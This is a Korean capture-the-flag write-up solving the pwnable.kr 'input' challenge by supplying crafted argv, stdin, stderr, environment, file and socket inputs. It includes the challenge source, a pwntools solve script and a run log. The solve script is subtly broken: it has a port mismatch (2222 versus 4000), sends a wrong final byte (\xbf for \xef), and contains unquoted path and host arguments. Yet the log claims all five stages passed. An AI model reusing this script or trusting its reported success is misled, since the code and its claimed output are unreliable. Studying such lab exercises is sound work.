# 문제
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)

---
#개요
서버에 접속하여 ls 명령을 입력해보면 input, input.c, flag 3개의 파일이 존재하는 것을 알 수 있습니다. cat 명령어를 통해 input.c 파일을 확인합니다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");

	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");
	return 0;
}
```
총 5개의 stage가 있고 이를 전부 만족해야만 flag를 획득할 수 있는 것으로 보입니다.

# 분석
##### stage1을 통과하기 위한 조건을 살펴봅니다.
```c
if(argc != 100) return 0;
if(strcmp(argv['A'],"\x00")) return 0;
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
printf("Stage 1 clear!\n");
```
정리하면 다음과 같습니다.
* argc(인자) = 100개
* argv['A'] = \x00
* argv['B'] = \x20\x0a\x0d  

##### stage2를 통과하기 위한 조건을 살펴봅니다.  
```c
char buf[4];
read(0, buf, 4);
if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
read(2, buf, 4);
if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
printf("Stage 2 clear!\n");
```
정리하면 다음과 같습니다.
* stdin : \x00\x0a\x00\xff
* stderr : \x00\x0a\x02\xff

##### stage3을 통과하기 위한 조건을 살펴봅시다.
```c
if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");
```
정리하면 다음과 같습니다.
* 환경변수(\de\xad\xbe\xbf)에 \xca\xfe\xba\xbe 의 값을 저장

##### stage4를 통과하기 위한 조건을 살펴봅시다.
```c
FILE* fp = fopen("\x0a", "r");
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
fclose(fp);
printf("Stage 4 clear!\n");
```
정리하면 다음과 같습니다.
* \x0a라는 파일을 읽음
* 첫 4byte가 \x00\x00\x00\x00

##### stage5를 통과하기 위한 조건을 살펴봅시다.
```c
int sd, cd;
struct sockaddr_in saddr, caddr;
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd == -1){
  printf("socket error, tell admin\n");
  return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );
if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
  printf("bind error, use another port\n");
      return 1;
}
listen(sd, 1);
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
if(cd < 0){
  printf("accept error, tell admin\n");
  return 0;
}
if( recv(cd, buf, 4, 0) != 4 ) return 0;
if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
printf("Stage 5 clear!\n");
```
정리하자면 다음과 같습니다.
* argv['C']의 정수형으로 변환한 값을 포트 번호로 소켓 서버 실행
* \de\xad\xbe\xbf 전송

이를 바탕으로 exploit code를 작성합니다.
```Python
from pwn import*

sys_argv = [str(i) for i in range(100)]
sys_argv[ord('A')] = "\x00"
sys_argv[ord('B')] = "\x20\x0a\x0d"

with open("./stderr",'a') as f:
  f.write("\x00\x0a\x02\xff")

env = {'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'}

with open("\x0a",'a') as f:
  f.write("\x00\x00\x00\x00")

sys_argv[ord('C')] = 2222
s = process(executable = '/home/input2/input', argv = sys_argv, stderr=open(./stderr), env = env)

s.sendline("\x00\x0a\x00\xff")

p = remote(localhost, 4000)
p.sendline('\xde\xad\xbe\xbf')
p.interactive()
```
해당 스크립트를 실행하기 위해 /tmp 파일로 이동하여 작성합니다. 그리고 현재 경로에 플래그가 없으므로 심볼릭 링크를 걸어줘야 합니다.
```
input2@ubuntu:/tmp/secretpack$ ln -s/home/input2/flag flag
input2@ubuntu:/tmp/secretpack$ python exp.py
[*]Starting local process '/home/input2/input':done
[*]Opening connection to localhost on port 2222:Done
[*]Switching to interactive mode
Welcome to pwnable.kr
Let's see if ou know how to give input to program
Just give me correct inputs then you will get the flag:)
Stage1 clear!
Stage2 clear!
Stage3 clear!
Stage4 clear!
Stage5 clear!
Mommy! I learned how to pass various input in Linux:)
[*]Got EOF while reading in interactive
$
```
